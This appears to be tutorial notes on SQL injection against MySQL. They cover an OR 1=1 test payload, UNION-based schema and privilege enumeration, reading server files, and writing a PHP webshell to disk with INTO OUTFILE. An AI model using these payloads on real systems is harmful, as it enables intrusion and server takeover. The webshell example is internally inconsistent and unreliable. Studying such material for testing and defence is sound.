# SQL Injection

This is one of the most common types of vulnerabilities that you can find on a web application. You don't need to use any tools for this, only an understanding of whatever type of database is on the backend. Examples here use MySQL, but the same principles apply to any query language.

## Testing For Vulnerabilities

You can check to see if an application is vulnerable to SQL injection using just about anything that takes user input, e.g. a login page or a search bar.

On the backend, an unsanitized query would look something like `SELECT address FROM users WHERE first_name='" + "John" "' AND last_name='" + "Deere" + "';"`.

You can check if queries are sanitized by submitting something like `' OR 1=1; -- -` into the search bar. In this example, you would get `address` from all users because the query would always produce a `true` result, thanks to `1=1`. `; -- -` terminates and comments out the rest of the query (the last `-` at the end is just to show there's a space after the other two).

Alternatively, attempting to tamper with the query could produce a syntax error on the screen, which tells you that you can directly interact with the database.

## UNION Operator

UNION is used to combine two queries, and you can use it to select information from just about any table in the database; you just have to make sure that the results of each query have the same number of columns.

## Information Schema

### General

In MySQL, the database called `INFORMATION_SCHEMA` contains metadata on the rest of the databases on the server.
You can see what other databases there are using `INFORMATION_SCHEMA.SCHEMATA`.

You can find info on a specific table using `INFORMATION_SCHEMA.TABLES`.

There is also info on all columns in the databases stored in `INFORMATION_SCHEMA.COLUMNS`.

### Permissions

In MySQL, you can check if the current user on the database has super admin permissions with `SELECT super_priv FROM mysql.user`.

You can see what other privileges you have using `SELECT sql_grants FROM information_schema.sql_show_grants`.

## Files

Keep in mind that you'll likely have to use the below commands with a UNION operator.

### Reading

If the OS user running the database server has the right permissions, you can read from files on the server's machine using `LOAD_FILE(file_path)`.

### Writing

In order to write, the database server's user needs to have file permissions, `secure_file_priv` must be disabled, and the OS user needs write access to wherever it is you want to write to on the machine.

You can check if `secure_file_priv` is enabled using `SHOW VARIABLES LIKE 'secure_file_priv';`.

You can also output the result of a query into a file using `into outfile`, e.g. `SELECT 1, 2, 3, 4 INTO OUTFILE '/var/etc/';`.

#### Webshells

The following bit of PHP can let you establish a webshell with the server's machine.
`<?php system('<command>'); ?>`

You just have to use `into outfile` to save it into a .php file.

E.g. `SELECT 1, 2, 3, "<?php system('pwd'); ?>" INTO OUTFILE '/var/etc/shell.php';`
You could then browse to /shell.php?0=id to see the output.
